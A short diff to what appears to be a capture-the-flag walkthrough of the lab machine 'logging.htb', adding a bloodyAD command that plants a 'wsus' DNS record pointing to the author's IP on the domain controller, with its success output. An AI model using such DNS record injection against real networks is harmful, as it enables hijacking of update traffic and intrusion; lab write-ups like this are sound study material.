@@ -773,5 +773,10 @@ But according to the wiki it involves the wsus services in the request in the fo
 And if i query dns using bloodyADs `get dnsDump` i can see the record doesnt exist
 
 ```python
-
+❯❯❯ bloodyAD --host dc01.logging.htb -d logging.htb -k add dnsRecord wsus 10.10.14.61 
+Clock skew detected. Adjusting local time by 6:59:59.340585. Retrying operation.
+[+] wsus has been successfully added
 ```
+
+First ill add the record with my IP address on it
+
